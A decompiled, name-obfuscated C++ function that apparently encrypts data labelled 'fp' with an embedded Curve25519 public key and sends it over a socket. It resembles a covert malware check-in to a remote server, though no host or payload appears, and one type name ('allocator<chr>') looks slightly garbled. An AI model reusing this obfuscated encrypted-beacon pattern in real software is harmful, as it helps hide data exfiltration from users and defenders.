
int ozzumyndvjsex(int sock,string *fp)

{
  int iVar1;
  long lVar2;
  long lVar3;
  size_t bufLen;
  void *vbuf;
  long in_FS_OFFSET;
  allocator<char> local_15d;
  int result;
  char *pubKey;
  size_t bodyLen;
  string client_secret;
  string client_public;
  string public_key;
  string nonce;
  string ciphertext;
  string length_header;
  string payload;
  basic_string<char,std--char_traits<char>,std--allocator<char>> local_68;
  basic_string<char,std--char_traits<char>,std--allocator<char>> local_48;
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  result = -1;
  pubKey = (char *)0x0;
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string();
                    /* try { // try from 00159a9e to 00159aa2 has its CatchHandler @ 00159d63 */
  crypto_box_curve25519xsalsa20poly1305_ref_keypair((basic_string *)&client_public);
                    /* try { // try from 00159aa8 to 00159aac has its CatchHandler @ 00159d4f */
  pubKey = tgexpgbgxulli(0x12);
  std::allocator<char>::allocator();
                    /* try { // try from 00159ae3 to 00159ae7 has its CatchHandler @ 00159cb5 */
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string
            ((char *)&public_key,(ulong)pubKey,(allocator *)0x20);
  std::allocator<char>::~allocator(&local_15d);
                    /* try { // try from 00159b06 to 00159b0a has its CatchHandler @ 00159d3b */
  yridlcsrsfalm(&nonce,0x18);
                    /* try { // try from 00159b34 to 00159b38 has its CatchHandler @ 00159d27 */
  crypto_box_curve25519xsalsa20poly1305_ref
            ((basic_string *)&ciphertext,(basic_string *)fp,(basic_string *)&nonce,
             (basic_string *)&public_key);
  lVar2 = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::length();
  lVar3 = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::length();
  bodyLen = lVar3 + lVar2;
                    /* try { // try from 00159b78 to 00159b7c has its CatchHandler @ 00159d13 */
  lengthHeader(&length_header,bodyLen);
                    /* try { // try from 00159b95 to 00159b99 has its CatchHandler @ 00159cff */
  std::operator+<char,std--char_traits<char>,std--allocator<char>>
            (&local_68,
             (basic_string<char,std--char_traits<char>,std--allocator<char>> *)&client_public,
             (basic_string<char,std--char_traits<char>,std--allocator<char>> *)&length_header);
                    /* try { // try from 00159baf to 00159bb3 has its CatchHandler @ 00159cdd */
  std::operator+<char,std--char_traits<char>,std--allocator<char>>
            (&local_48,&local_68,
             (basic_string<char,std--char_traits<char>,std--allocator<char>> *)&nonce);
                    /* try { // try from 00159bc9 to 00159bcd has its CatchHandler @ 00159ccc */
  std::operator+<char,std--char_traits<char>,std--allocator<char>>
            ((basic_string<char,std--char_traits<char>,std--allocator<char>> *)&payload,&local_48,
             (basic_string<char,std--char_traits<char>,std--allocator<char>> *)&ciphertext);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&local_48);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&local_68);
  bufLen = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::length();
  vbuf = (void *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::data
                           ();
                    /* try { // try from 00159c12 to 00159c2e has its CatchHandler @ 00159cee */
  result = aqoickhvmchnw(sock,vbuf,bufLen);
  aotxxfxjjvuoy(0x12);
  iVar1 = result;
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<chr>> *)&payload);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&length_header);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&ciphertext);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&nonce);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&public_key);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&client_public);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&client_secret);
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return iVar1;
}

